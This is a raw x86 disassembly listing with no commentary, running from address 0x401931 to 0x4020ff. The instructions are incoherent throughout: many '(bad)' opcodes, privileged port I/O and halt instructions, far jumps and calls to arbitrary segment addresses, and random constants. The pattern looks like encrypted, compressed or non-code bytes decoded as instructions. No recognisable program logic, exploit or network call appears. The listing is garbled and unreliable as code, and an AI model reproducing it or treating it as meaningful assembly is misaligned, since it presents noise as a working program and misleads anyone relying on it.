  401931:	and    ebx,ebx
  401933:	pop    esi
  401934:	les    edi,FWORD PTR [edi+0x3f]
  401937:	adc    BYTE PTR [eax+0x5c02a512],dh
  40193d:	xchg   edi,eax
  40193e:	push   eax
  40193f:	mov    BYTE PTR [edx+0x24bcf382],bl
  401945:	or     BYTE PTR [eax-0x4],cl
  401948:	call   0x841391aa
  40194d:	dec    eax
  40194e:	xchg   DWORD PTR [eax-0x3c],ebp
  401951:	sbb    al,0x84
  401953:	inc    ebx
  401954:	mov    eax,0x2f35914e
  401959:	pop    ecx
  40195a:	mov    dh,0x98
  40195c:	xchg   ebx,eax
  40195d:	jl     0x401990
  40195f:	(bad)
  401963:	mov    ch,BYTE PTR es:[edi]
  401966:	and    cl,bl
  401968:	mov    ebx,0x17ff49d5
  40196d:	cdq    
  40196e:	xchg   DWORD PTR [edi],esp
  401970:	(bad)  
  401971:	hlt    
  401972:	xchg   ecx,eax
  401973:	xacquire xchg BYTE PTR [ebx+0x5e],ah
  401977:	icebp  
  401978:	mov    ch,0xc4
  40197a:	fld    QWORD PTR [ecx-0x1a]
  40197d:	rol    DWORD PTR [ecx],cl
  40197f:	in     eax,dx
  401980:	(bad)  
  401981:	push   esi
  401982:	pop    edi
  401983:	mov    ebp,0x9331abac
  401988:	out    dx,eax
  401989:	xor    ebx,DWORD PTR [edx-0x25]
  40198c:	fsub   QWORD PTR [ebp+ebx*2+0x79fdb59]
  401993:	nop
  401994:	push   edi
  401995:	loop   0x401957
  401997:	xchg   ebp,eax
  401998:	hlt    
  401999:	and    BYTE PTR [edi+0x36860605],0xe2
  4019a0:	jno    0x4019f4
  4019a2:	repz dec ebp
  4019a4:	push   ebx
  4019a5:	mov    ah,0xe7
  4019a7:	pop    es
  4019a8:	pop    edx
  4019a9:	or     DWORD PTR [ebx+0xa],eax
  4019ac:	icebp  
  4019ad:	in     eax,dx
  4019ae:	lods   eax,DWORD PTR ds:[esi]
  4019af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019b0:	pop    eax
  4019b1:	sub    ebp,DWORD PTR [ecx-0x63a601c2]
  4019b7:	cli    
  4019b8:	xor    al,0x26
  4019ba:	loop   0x4019a8
  4019bc:	xor    eax,0x171bb968
  4019c1:	jmp    0x7898c61a
  4019c6:	outs   dx,BYTE PTR ds:[esi]
  4019c7:	mov    edx,0xf2e64cc6
  4019cc:	(bad)  
  4019ce:	call   0x6a41:0x959f39cb
  4019d5:	push   es
  4019d6:	sar    esi,0x87
  4019d9:	and    ah,BYTE PTR cs:[eax+0x37]
  4019dd:	inc    esp
  4019de:	and    edi,DWORD PTR [ecx-0x2]
  4019e1:	adc    DWORD PTR [edx-0x2f],esi
  4019e4:	push   ecx
  4019e5:	test   eax,0x13c4584e
  4019ea:	cdq    
  4019eb:	cmp    DWORD PTR [ebp+esi*1+0x4e0d56e],0x67
  4019f3:	push   ecx
  4019f4:	call   0x68ee4274
  4019f9:	add    edi,DWORD PTR [esi-0x4b26083e]
  4019ff:	sbb    al,0xc4
  401a01:	iret   
  401a02:	nop
  401a03:	adc    BYTE PTR [ebx-0x1d],dl
  401a06:	mov    al,ds:0x7b652fc0
  401a0b:	lods   eax,DWORD PTR ds:[esi]
  401a0c:	adc    DWORD PTR [ebx],0x55
  401a0f:	or     ebx,DWORD PTR [ebx+ecx*4+0x57bebc3a]
  401a16:	nop
  401a17:	aas    
  401a18:	pop    esi
  401a19:	(bad)  
  401a1b:	ins    BYTE PTR es:[edi],dx
  401a1c:	idiv   ebp
  401a1e:	adc    ah,BYTE PTR [esi+ebp*8-0x21df5f36]
  401a25:	add    ebp,DWORD PTR [ecx+eax*1-0x3]
  401a29:	dec    ecx
  401a2a:	inc    esi
  401a2b:	inc    ebp
  401a2c:	pop    edx
  401a2d:	sub    esi,DWORD PTR [eax+0x5a019249]
  401a33:	dec    eax
  401a34:	jmp    0x4f8d:0x2aa00ea5
  401a3b:	test   DWORD PTR [edx],esp
  401a3d:	mov    bh,0xd1
  401a3f:	adc    eax,0x1b2b8f0a
  401a44:	pop    esp
  401a45:	add    ch,cl
  401a47:	das    
  401a48:	sbb    BYTE PTR ds:0x6fa1f378,0x30
  401a4f:	adc    dh,dl
  401a51:	repz loopne 0x401a9f
  401a54:	jbe    0x401a73
  401a56:	mov    DWORD PTR [ebx+edx*4-0x63],esp
  401a5a:	jo     0x401ac3
  401a5c:	ret    
  401a5d:	pop    esi
  401a5e:	bound  esi,QWORD PTR [esi-0x4592c69]
  401a64:	sbb    al,0xb5
  401a66:	mov    al,ds:0x8375df79
  401a6b:	jmp    0xaed5:0x1774b023
  401a72:	jle    0x401a87
  401a74:	ret    
  401a75:	or     DWORD PTR [eax+eiz*1-0x201b1986],edi
  401a7c:	fsub   DWORD PTR [ecx-0x2e]
  401a7f:	mov    ah,0xb1
  401a81:	pop    edi
  401a82:	retf   
  401a83:	push   ecx
  401a84:	mov    DWORD PTR [ebx+0x47],eax
  401a87:	jmp    0xf11e773c
  401a8c:	mov    esp,0xf266c3ce
  401a91:	and    al,0xdf
  401a93:	(bad)  
  401a94:	out    dx,al
  401a95:	aas    
  401a96:	mov    bl,0x79
  401a98:	es adc al,0xf3
  401a9b:	rcr    edx,cl
  401a9d:	jnp    0x401b0e
  401a9f:	and    dl,bl
  401aa1:	test   eax,0xae958fc5
  401aa6:	jae    0x401ab5
  401aa8:	fst    QWORD PTR ds:0xb48aa025
  401aae:	mul    BYTE PTR ds:0x94d30d86
  401ab4:	xchg   edi,eax
  401ab5:	inc    ebx
  401ab6:	sub    eax,0xc50d1f46
  401abb:	mov    esp,ds
  401abd:	cmp    BYTE PTR [ebx+0x11],0xb5
  401ac1:	and    eax,0xc72ada65
  401ac6:	sbb    al,0x2e
  401ac8:	sar    DWORD PTR [edi+0x3],cl
  401acb:	(bad)  
  401acc:	rcr    BYTE PTR [ebx-0x473bd1c6],1
  401ad2:	add    dl,BYTE PTR [ebx]
  401ad4:	imul   edi,DWORD PTR [ecx+0xe],0x9372c8d0
  401adb:	push   edi
  401adc:	mov    ch,0x5b
  401ade:	stos   DWORD PTR es:[edi],eax
  401adf:	pop    es
  401ae0:	call   0x47c2:0xd86a931e
  401ae7:	push   es
  401ae8:	and    DWORD PTR ds:0x71a06347,edi
  401aee:	adc    DWORD PTR [esi-0x1909f331],edx
  401af4:	repz in eax,dx
  401af6:	pop    eax
  401af7:	out    0x9f,al
  401af9:	jg     0x401aed
  401afb:	cmc    
  401afc:	aaa    
  401afd:	leave  
  401afe:	xchg   edi,eax
  401aff:	cmp    edi,edx
  401b01:	idiv   BYTE PTR [di]
  401b04:	out    dx,al
  401b05:	pop    ds
  401b06:	js     0x401b86
  401b08:	cmp    esi,DWORD PTR [edi+0x7b]
  401b0b:	es mov es,ecx
  401b0e:	jb     0x401b0c
  401b10:	mov    edi,0xc16428d1
  401b15:	mov    ebp,0x2af79ee3
  401b1a:	mov    dh,0x8b
  401b1c:	sahf   
  401b1d:	jns    0x401b1e
  401b1f:	add    BYTE PTR [ecx],dh
  401b21:	shl    DWORD PTR es:[edi],1
  401b24:	xchg   BYTE PTR [edi],dh
  401b26:	(bad)  [edi]
  401b28:	call   0x375b:0x9922f8fe
  401b2f:	mov    ch,0xf2
  401b31:	leave  
  401b32:	aaa    
  401b33:	cmp    DWORD PTR [ebp-0x676fa2e3],edi
  401b39:	dec    esi
  401b3a:	mov    eax,ecx
  401b3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b3d:	stos   DWORD PTR es:[edi],eax
  401b3e:	xor    bl,dh
  401b40:	pop    eax
  401b41:	jae    0x401b27
  401b43:	pusha  
  401b44:	xchg   DWORD PTR ds:0x607e23b7,esi
  401b4a:	mov    bh,BYTE PTR [edx]
  401b4c:	test   BYTE PTR ds:0x327b1e94,al
  401b52:	mov    dl,0x3a
  401b54:	out    dx,al
  401b55:	das    
  401b56:	dec    ebp
  401b57:	cmp    eax,0xd9c8411a
  401b5c:	and    al,0x6c
  401b5e:	xchg   ecx,eax
  401b5f:	ret    
  401b60:	sbb    eax,0xcf8f6477
  401b65:	dec    edx
  401b66:	or     eax,0xda51dd37
  401b6b:	and    eax,0xc15b5263
  401b70:	jns    0x401b93
  401b72:	sub    dl,BYTE PTR [ebp+0x2c]
  401b75:	mov    esp,0x72ededa4
  401b7a:	mov    ecx,0x8fabd1db
  401b7f:	mov    ch,0x25
  401b81:	jp     0x401bd7
  401b83:	in     eax,dx
  401b84:	sbb    BYTE PTR [eax],bh
  401b86:	in     al,0x94
  401b88:	popa   
  401b89:	stos   BYTE PTR es:[edi],al
  401b8a:	test   dl,dh
  401b8c:	out    dx,eax
  401b8d:	jnp    0x401bef
  401b8f:	lea    esp,[esi-0x60]
  401b92:	dec    edx
  401b93:	js     0x401b4c
  401b95:	push   ecx
  401b96:	stos   DWORD PTR es:[edi],eax
  401b97:	retf   
  401b98:	cmp    BYTE PTR [ebx+0x5a],ah
  401b9b:	inc    ebx
  401b9c:	inc    esp
  401b9d:	retf   0xbd8
  401ba0:	ds pop ss
  401ba2:	or     BYTE PTR [edi-0x2d],bh
  401ba5:	jmp    0x401c05
  401ba7:	and    DWORD PTR [edi],edi
  401ba9:	jg     0x401b4b
  401bab:	sub    dl,cl
  401bad:	mov    ds:0xc3657390,al
  401bb2:	ret    0xa0e9
  401bb5:	shl    BYTE PTR [ebx-0x26969eca],1
  401bbb:	and    DWORD PTR [ecx-0x466bbc14],ebp
  401bc1:	cmp    bl,ah
  401bc3:	std    
  401bc4:	jo     0x401bf5
  401bc6:	fldcw  WORD PTR [edi+esi*2-0x2d]
  401bca:	mov    esi,0x1788b61b
  401bcf:	out    0x4a,al
  401bd1:	push   ss
  401bd2:	pop    ebp
  401bd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bd4:	in     al,dx
  401bd5:	sub    eax,0x201d69c7
  401bda:	dec    esi
  401bdb:	shl    DWORD PTR [edi+eax*8],1
  401bde:	adc    BYTE PTR [ebp+0x22c6474f],bh
  401be4:	out    dx,al
  401be5:	mov    dl,BYTE PTR [edi+0x998e901]
  401beb:	in     eax,0xae
  401bed:	mov    dl,0x59
  401bef:	pushf  
  401bf0:	push   eax
  401bf1:	aaa    
  401bf2:	push   ebp
  401bf3:	push   0x52
  401bf5:	xchg   ebx,eax
  401bf6:	mov    BYTE PTR [ecx],ch
  401bf8:	cmp    BYTE PTR [edi],ch
  401bfa:	in     al,dx
  401bfb:	jbe    0x401c02
  401bfd:	nop
  401bfe:	mov    ds:0xdb83e511,eax
  401c03:	fcmovnb st,st(0)
  401c05:	sub    eax,0x3aa2eb72
  401c0a:	retf   
  401c0b:	retf   
  401c0c:	lods   eax,DWORD PTR ds:[esi]
  401c0d:	rcr    DWORD PTR [ecx],1
  401c0f:	ret    0xc970
  401c12:	fcmovnbe st,st(0)
  401c14:	mov    edi,0x8fc51374
  401c19:	xchg   BYTE PTR [edx-0x60ed613c],dh
  401c1f:	mov    bh,0x57
  401c21:	jg     0x401c32
  401c23:	add    bl,al
  401c25:	rcr    BYTE PTR [ecx-0x3a],0x2d
  401c29:	mov    ds:0xc7024554,al
  401c2e:	dec    ebp
  401c2f:	adc    ch,0x19
  401c32:	fsubr  QWORD PTR [esi+edx*4]
  401c35:	ins    DWORD PTR es:[edi],dx
  401c36:	leave  
  401c37:	repz cmc 
  401c39:	fstp   QWORD PTR [edx]
  401c3b:	jne    0x401c3d
  401c3d:	mov    edi,0x7492ad7e
  401c42:	xor    bh,0xb3
  401c45:	mov    edi,0x37a8bb80
  401c4a:	sbb    dh,BYTE PTR [edi]
  401c4c:	test   BYTE PTR [edi+0x6a9c00cd],bh
  401c52:	and    bh,BYTE PTR [ebx]
  401c54:	and    eax,0x4ecc6716
  401c59:	and    eax,0x78b23460
  401c5e:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c60:	in     eax,0xd2
  401c62:	in     eax,dx
  401c63:	lock jne 0x401cc1
  401c66:	lahf   
  401c67:	jb     0x401c7e
  401c69:	cmp    al,0x1a
  401c6b:	mov    WORD PTR ds:0x2b9f82ad,cs
  401c71:	cmp    BYTE PTR ds:0xe958def5,dl
  401c77:	(bad)  [ecx-0x69d4b21b]
  401c7d:	rcl    DWORD PTR cs:[edx],0x2e
  401c81:	pushf  
  401c82:	das    
  401c83:	push   edi
  401c84:	loopne 0x401c30
  401c86:	mov    BYTE PTR [eax+0x32e2f630],al
  401c8c:	repz dec ecx
  401c8e:	int    0x14
  401c90:	pop    ss
  401c91:	or     BYTE PTR [edi],dh
  401c93:	push   cs
  401c94:	rol    esi,cl
  401c96:	jb     0x401c87
  401c98:	ret    
  401c99:	xlat   BYTE PTR ds:[ebx]
  401c9a:	cmp    eax,0xcdb03cf6
  401c9f:	mov    cl,0x75
  401ca1:	dec    ecx
  401ca2:	push   ebx
  401ca3:	lea    esi,[edi]
  401ca5:	xchg   edx,eax
  401ca6:	jo     0x401c69
  401ca8:	retf   
  401ca9:	mov    dl,0x54
  401cab:	das    
  401cac:	dec    eax
  401cad:	mov    eax,0x2c112aa7
  401cb2:	out    dx,eax
  401cb3:	int    0xd3
  401cb5:	push   ss
  401cb6:	sub    BYTE PTR [esp+ecx*4],bl
  401cb9:	retf   
  401cba:	rol    dl,1
  401cbc:	popa   
  401cbd:	add    DWORD PTR [ebx-0x56],0x76
  401cc1:	xor    edx,ebx
  401cc3:	pop    esi
  401cc4:	jge    0x401d17
  401cc6:	push   0xffffffd1
  401cc8:	xlat   BYTE PTR ds:[ebx]
  401cc9:	pushf  
  401cca:	inc    ecx
  401ccb:	sub    eax,ecx
  401ccd:	inc    esp
  401cce:	dec    ebp
  401ccf:	xor    cl,BYTE PTR [eax+ebx*2]
  401cd2:	dec    ebx
  401cd3:	and    esp,eax
  401cd5:	out    dx,eax
  401cd6:	jl     0x401d06
  401cd8:	or     ch,BYTE PTR [edi+0x198a6c4f]
  401cde:	push   ds
  401cdf:	adc    eax,0xf5a0b3e7
  401ce4:	fldcw  WORD PTR [ebp+0x6da61ff5]
  401cea:	ret    0xa651
  401ced:	ret    0x4c6f
  401cf0:	je     0x401c9e
  401cf2:	pop    ecx
  401cf3:	add    eax,DWORD PTR ds:0xe4b21f0f
  401cf9:	std    
  401cfa:	mov    edi,0x4f93addd
  401cff:	retf   
  401d00:	push   ebp
  401d01:	pushf  
  401d02:	mov    ds:0xbd148865,eax
  401d07:	add    al,0xc8
  401d09:	imul   eax,edx,0xffffffac
  401d0c:	je     0x401d08
  401d0e:	pop    eax
  401d0f:	sub    esi,DWORD PTR [eax+0x779e68b0]
  401d15:	xchg   esp,eax
  401d16:	pop    ebx
  401d17:	sbb    eax,0x29c42c31
  401d1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d1d:	cli    
  401d1e:	adc    cl,bh
  401d20:	xor    al,0xfb
  401d22:	out    dx,eax
  401d23:	and    al,0x3
  401d25:	imul   ecx,DWORD PTR [eax],0x53
  401d28:	sbb    DWORD PTR ds:0x30aa72c7,ebp
  401d2e:	push   edx
  401d2f:	mov    ch,0xf9
  401d31:	pushf  
  401d32:	aas    
  401d33:	sbb    eax,0x6adecd9b
  401d38:	xor    al,0x91
  401d3a:	pop    edi
  401d3b:	int    0x51
  401d3d:	sub    BYTE PTR [eax],0xa0
  401d40:	xlat   BYTE PTR ds:[ebx]
  401d41:	pop    ebx
  401d42:	dec    esp
  401d43:	and    al,0xe8
  401d45:	dec    esp
  401d46:	and    eax,0xff850458
  401d4b:	and    eax,0x9dcfd4eb
  401d50:	daa    
  401d51:	ja     0x401d5c
  401d53:	addr16 jg 0x401d33
  401d56:	dec    ecx
  401d57:	push   0x854b4c97
  401d5c:	jnp    0x401d84
  401d5e:	xor    BYTE PTR [edx],0x8e
  401d61:	dec    edx
  401d62:	cmp    DWORD PTR [ecx+0x44b405fd],0x5f
  401d69:	nop
  401d6a:	clc    
  401d6b:	push   edi
  401d6c:	mov    bh,BYTE PTR [edx-0x69]
  401d6f:	mov    eax,ds:0x9db03c3c
  401d74:	outs   dx,BYTE PTR ds:[esi]
  401d75:	xor    al,0x61
  401d77:	lahf   
  401d78:	sub    al,0x5d
  401d7a:	imul   ebp,DWORD PTR [ebx-0x6ffd847e],0x29a48e4f
  401d84:	jne    0x401db5
  401d86:	pop    ecx
  401d87:	inc    eax
  401d88:	(bad)
  401d8b:	mov    ds:0x838eff40,eax
  401d90:	or     DWORD PTR [esi+0x23],ecx
  401d93:	outs   dx,DWORD PTR ds:[esi]
  401d94:	in     al,0x17
  401d96:	pop    ds
  401d97:	xchg   ecx,eax
  401d98:	mov    cl,0xc5
  401d9a:	rol    BYTE PTR [eax+0x61e14ff4],1
  401da0:	cld    
  401da1:	or     eax,DWORD PTR [ebx-0x19bb4293]
  401da7:	popa   
  401da8:	stos   BYTE PTR es:[edi],al
  401da9:	(bad)  
  401daa:	lock dec edx
  401dac:	pop    edx
  401dad:	mov    ch,0xf
  401daf:	arpl   cx,dx
  401db1:	daa    
  401db2:	push   esi
  401db3:	xchg   ebp,eax
  401db4:	addr16 dec ecx
  401db6:	mov    dh,0x43
  401db8:	fidiv  WORD PTR [ebx-0x61]
  401dbb:	add    al,0x2f
  401dbd:	in     al,0x4d
  401dbf:	sub    DWORD PTR [ecx+0x6b4a227],0x36b48cc1
  401dc9:	push   0x66709e9e
  401dce:	cld    
  401dcf:	cmc    
  401dd0:	xchg   esi,eax
  401dd1:	sbb    ebp,esi
  401dd3:	adc    al,0xd2
  401dd5:	jl     0x401e15
  401dd7:	push   eax
  401dd8:	add    cl,BYTE PTR [ebx+0x13]
  401ddb:	aad    0xdf
  401ddd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401dde:	push   edi
  401ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401de0:	adc    DWORD PTR [edi+0x1a],ebp
  401de3:	aas    
  401de4:	inc    edx
  401de5:	mov    ah,0x8c
  401de7:	aas    
  401de8:	scas   al,BYTE PTR es:[edi]
  401de9:	sbb    eax,0x60515887
  401dee:	mov    al,ds:0x4f1985ae
  401df3:	hlt    
  401df4:	out    dx,al
  401df5:	in     eax,0x2b
  401df7:	stos   DWORD PTR es:[edi],eax
  401df8:	sbb    al,ah
  401dfa:	ds xchg ebp,eax
  401dfc:	popf   
  401dfd:	ror    DWORD PTR [ebp+ebx*1+0x40956863],0x6b
  401e05:	idiv   ch
  401e07:	cmp    DWORD PTR [edi-0x3f],ecx
  401e0a:	push   ss
  401e0b:	dec    edi
  401e0c:	outs   dx,BYTE PTR ds:[esi]
  401e0d:	xchg   edx,eax
  401e0e:	and    ebx,eax
  401e10:	fs dec ecx
  401e12:	push   esp
  401e13:	jmp    0xe7f4:0xbcca5b6e
  401e1a:	imul   eax,DWORD PTR ds:0x28f45891,0xa6482dbf
  401e24:	(bad)  
  401e25:	and    DWORD PTR [ecx],ecx
  401e27:	rol    DWORD PTR [edx+ebx*4+0x4],1
  401e2b:	xor    DWORD PTR [ebx+0x35],edx
  401e2e:	rcr    BYTE PTR [edi],1
  401e30:	mov    ebp,0x8d1bec32
  401e35:	add    eax,0x9b663cf2
  401e3a:	mov    cl,0x45
  401e3c:	sub    DWORD PTR [eax*4+0x35c33104],edi
  401e43:	adc    bh,BYTE PTR [ecx+0x28e0376d]
  401e49:	jmp    0x401e75
  401e4b:	dec    eax
  401e4c:	jne    0x401e8f
  401e4e:	shl    BYTE PTR [ecx],0xed
  401e51:	sub    cl,ch
  401e53:	sub    DWORD PTR [esi+eax*4+0x3140672e],edi
  401e5a:	imul   BYTE PTR [edx+0x1]
  401e5d:	fnsave [esi+eax*1]
  401e60:	jl     0x401e38
  401e62:	adc    eax,0x368af960
  401e67:	packssdw mm1,QWORD PTR [ecx-0x37b027ea]
  401e6e:	push   ds
  401e6f:	cld    
  401e70:	stos   DWORD PTR es:[edi],eax
  401e71:	sahf   
  401e72:	cmc    
  401e73:	add    DWORD PTR [eax+0x18b95a7b],ecx
  401e79:	add    dh,BYTE PTR [edx-0x5bc659e1]
  401e7f:	add    ebp,ebx
  401e81:	push   eax
  401e82:	push   ebp
  401e83:	loope  0x401e85
  401e85:	(bad)  
  401e86:	imul   esi,DWORD PTR [ebx+0x44850bad],0xdfecaf4d
  401e90:	mov    cs,WORD PTR ds:0xdbd1cf4d
  401e96:	enter  0x8c02,0xbb
  401e9a:	xchg   esp,eax
  401e9b:	popf   
  401e9c:	hlt    
  401e9d:	in     al,dx
  401e9e:	mov    ch,0xa
  401ea0:	hlt    
  401ea1:	popf   
  401ea2:	xchg   ecx,eax
  401ea3:	mov    ch,0x6c
  401ea5:	pop    edi
  401ea6:	pop    ebx
  401ea7:	push   0xab9d159b
  401eac:	mov    edi,0x636e11e
  401eb1:	push   eax
  401eb2:	mov    ah,0xb6
  401eb4:	xchg   esi,eax
  401eb5:	stos   DWORD PTR es:[edi],eax
  401eb6:	xchg   esi,eax
  401eb7:	and    eax,0x4a9bcb30
  401ebc:	jmp    0xf2393d1e
  401ec1:	fadd   QWORD PTR [ebp+0x21]
  401ec4:	push   eax
  401ec5:	inc    eax
  401ec6:	js     0x401ea2
  401ec8:	imul   BYTE PTR [eax]
  401eca:	fidiv  DWORD PTR [ebx-0x2c0b4225]
  401ed0:	neg    BYTE PTR [ebp-0x3a]
  401ed3:	add    ah,dh
  401ed5:	push   esi
  401ed6:	scas   al,BYTE PTR es:[edi]
  401ed7:	mov    esi,0xdb4e1c80
  401edc:	frstor [eax-0x61]
  401edf:	xchg   ecx,eax
  401ee0:	das    
  401ee1:	dec    ecx
  401ee2:	pop    ebp
  401ee3:	mov    ds:0xae2aa614,eax
  401ee8:	enter  0x2920,0x52
  401eec:	aad    0x54
  401eee:	cli    
  401eef:	retf   0xe661
  401ef2:	and    al,0x7
  401ef4:	dec    ebx
  401ef5:	sub    dl,BYTE PTR [edi-0x1cb37bb8]
  401efb:	inc    edx
  401efc:	ins    BYTE PTR es:[edi],dx
  401efd:	loope  0x401f1d
  401eff:	arpl   sp,cx
  401f01:	mov    ds:0xe0331ea5,eax
  401f06:	dec    ecx
  401f07:	je     0x401ef0
  401f09:	sbb    esp,0x6ddc8338
  401f0f:	cmc    
  401f10:	sbb    eax,0x4221e30f
  401f15:	(bad)  
  401f16:	into   
  401f17:	jo     0x401f2f
  401f19:	mov    ds,WORD PTR [edx-0x2e]
  401f1c:	(bad)  
  401f1d:	sub    eax,0xd9ff7e19
  401f22:	and    edi,DWORD PTR [ebx-0x1863449f]
  401f28:	out    dx,al
  401f29:	repz push 0x6b4f0d4f
  401f2f:	retf   
  401f30:	sbb    al,0xa1
  401f32:	inc    edi
  401f33:	lea    ebx,[ecx]
  401f35:	(bad)  
  401f36:	pop    ebp
  401f37:	xchg   esp,eax
  401f38:	ret    0xa340
  401f3b:	mov    eax,ds:0xdb45bc15
  401f40:	stc    
  401f41:	pop    eax
  401f42:	test   al,0xe0
  401f44:	or     eax,0xd4ebedea
  401f49:	sahf   
  401f4a:	ins    BYTE PTR es:[edi],dx
  401f4b:	xchg   esi,eax
  401f4c:	or     al,0x95
  401f4e:	repnz xchg edx,eax
  401f50:	xchg   edi,eax
  401f51:	add    ebx,0xd4aa3eea
  401f57:	and    BYTE PTR [ebp+0x42],0x1e
  401f5b:	xor    DWORD PTR [ebx+0x13],ebx
  401f5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f5f:	sbb    DWORD PTR [ebp+edi*1+0x83243e8],0x8f16e29b
  401f6a:	mov    DWORD PTR [ebx],ecx
  401f6c:	scas   eax,DWORD PTR es:[edi]
  401f6d:	jmp    0x401f67
  401f6f:	dec    esi
  401f70:	ja     0x401f92
  401f72:	leave  
  401f73:	mov    ebx,0x2f6fd829
  401f78:	jo     0x401fd1
  401f7a:	xchg   edx,eax
  401f7b:	cmp    DWORD PTR [ebx-0x60b0cba2],ecx
  401f81:	adc    edx,DWORD PTR [esp+esi*8+0x45a25f0f]
  401f88:	mul    DWORD PTR [ebx-0x4d4c3607]
  401f8e:	dec    eax
  401f8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f90:	push   eax
  401f91:	jo     0x401f43
  401f93:	leave  
  401f94:	and    eax,edx
  401f96:	sub    esp,DWORD PTR [edi-0x7ce5aea3]
  401f9c:	xor    eax,0x69bae545
  401fa1:	push   ebp
  401fa2:	clc    
  401fa3:	enter  0xefd0,0xf6
  401fa7:	in     al,0x3b
  401fa9:	jnp    0x401f8e
  401fab:	hlt    
  401fac:	int    0xb7
  401fae:	mov    ch,0xa9
  401fb0:	aaa    
  401fb1:	ret    
  401fb2:	test   al,0x6b
  401fb4:	and    DWORD PTR ds:0xff2d31e1,eax
  401fba:	mov    bh,0x36
  401fbc:	push   esp
  401fbd:	push   es
  401fbe:	mov    dh,0xf1
  401fc0:	stc    
  401fc1:	leave  
  401fc2:	ds jg  0x402028
  401fc5:	enter  0x446d,0xd3
  401fc9:	outs   dx,DWORD PTR ds:[esi]
  401fca:	jmp    0x3152b6ab
  401fcf:	push   ecx
  401fd0:	jo     0x401f8d
  401fd2:	sub    dh,BYTE PTR ds:0x41087cd3
  401fd8:	pop    eax
  401fd9:	pop    ebx
  401fda:	xchg   esi,eax
  401fdb:	ss jne 0x401f93
  401fde:	out    dx,eax
  401fdf:	pop    esp
  401fe0:	(bad)  
  401fe1:	imul   ecx,DWORD PTR [esi+0x1bad36cf],0x897d2b3a
  401feb:	jno    0x401f95
  401fed:	jl     0x401f87
  401fef:	sbb    al,0x10
  401ff1:	(bad)  
  401ff2:	(bad)  [edx-0x5f]
  401ff5:	enter  0x1090,0x49
  401ff9:	jae    0x402068
  401ffb:	fist   DWORD PTR [esi]
  401ffd:	adc    al,0xdd
  401fff:	inc    ecx
  402000:	mov    bh,0xfd
  402002:	imul   BYTE PTR [edx+0x38]
  402005:	mov    ah,0x78
  402007:	xor    BYTE PTR ds:0x70ebbb77,0x19
  40200e:	js     0x402041
  402010:	mov    bh,0x56
  402012:	hlt    
  402013:	ja     0x402081
  402015:	mov    ah,0xe
  402017:	jle    0x40200a
  402019:	pop    ds
  40201a:	imul   esp,DWORD PTR [ebx],0xffffff86
  40201d:	fs dec ebx
  40201f:	mov    ds:0x334145b1,eax
  402024:	not    BYTE PTR [esi]
  402026:	xlat   BYTE PTR ds:[ebx]
  402027:	ins    BYTE PTR es:[edi],dx
  402028:	adc    al,0xa7
  40202a:	sbb    DWORD PTR [ebp+0x62],esi
  40202d:	jge    0x401fce
  40202f:	inc    edx
  402030:	cmp    al,0xcd
  402032:	jge    0x401fd6
  402034:	aaa    
  402035:	inc    ebx
  402036:	dec    ebx
  402037:	lea    edx,[ebx+0x69feef4]
  40203d:	mov    esp,0x8deb72e9
  402042:	popf   
  402043:	push   ebp
  402044:	mov    eax,ds:0xc99398b3
  402049:	sbb    eax,DWORD PTR [edx+0x5f]
  40204c:	sbb    eax,0x33dd17d3
  402051:	xor    BYTE PTR [edi],dl
  402053:	pop    es
  402054:	shr    DWORD PTR [esi+0x9],0x62
  402058:	out    dx,al
  402059:	push   eax
  40205a:	push   eax
  40205b:	cmp    DWORD PTR [edi],esi
  40205d:	outs   dx,DWORD PTR ds:[esi]
  40205e:	pop    DWORD PTR [esi-0x2ea855fd]
  402064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402065:	jp     0x4020c4
  402067:	into   
  402068:	cdq    
  402069:	data16 int3 
  40206b:	adc    edx,DWORD PTR [ebx-0x1f]
  40206e:	and    esp,DWORD PTR [eax]
  402070:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402071:	jne    0x402015
  402073:	loopne 0x40205b
  402075:	arpl   dx,sp
  402077:	jmp    DWORD PTR [ebx-0x78]
  40207a:	mov    eax,0x62d16a94
  40207f:	jmp    0x65b:0x84122e3d
  402086:	das    
  402087:	popf   
  402088:	out    0xcd,al
  40208a:	xchg   ebp,eax
  40208b:	push   ebp
  40208c:	and    eax,0x51a8eeb3
  402091:	les    ecx,FWORD PTR [ebx+0x564c7370]
  402097:	push   edi
  402098:	and    bl,BYTE PTR [eax+0x10]
  40209b:	cmove  edx,DWORD PTR [edx+0x2008f747]
  4020a2:	adc    al,0xc9
  4020a4:	pop    esp
  4020a5:	stc    
  4020a6:	aad    0xe3
  4020a8:	push   ax
  4020aa:	mov    WORD PTR [edx+0x6dc17e1a],ds
  4020b0:	ja     0x40210b
  4020b2:	lea    ebx,[esi-0x51]
  4020b5:	xchg   ebx,eax
  4020b6:	outs   dx,BYTE PTR ds:[esi]
  4020b7:	pop    esp
  4020b8:	fisttp QWORD PTR [edx]
  4020ba:	rcl    BYTE PTR [edi-0x5b],0xcf
  4020be:	shr    BYTE PTR [edi],cl
  4020c0:	mov    ebx,0x63a22bc9
  4020c5:	leave  
  4020c6:	jo     0x402049
  4020c8:	call   0xb3ff:0x533b10ec
  4020cf:	or     eax,0xcc8bde99
  4020d4:	cmp    bh,BYTE PTR ss:[edx+eiz*2+0x40d0f9cc]
  4020dc:	mov    dh,0x70
  4020de:	mov    al,ds:0x4ea403cc
  4020e3:	push   edi
  4020e4:	mov    al,0x68
  4020e6:	mov    dl,0xad
  4020e8:	mov    dh,0x79
  4020ea:	sub    al,0x24
  4020ec:	dec    edi
  4020ed:	(bad)  
  4020ee:	push   eax
  4020ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020f0:	jp     0x40210e
  4020f2:	sub    dl,cl
  4020f4:	jb     0x4020ee
  4020f6:	push   ebx
  4020f7:	or     BYTE PTR [ecx],dl
  4020f9:	push   0x21
  4020fb:	pop    esp
  4020fc:	cmc    
  4020fd:	cs popf 
  4020ff:	dec    eax
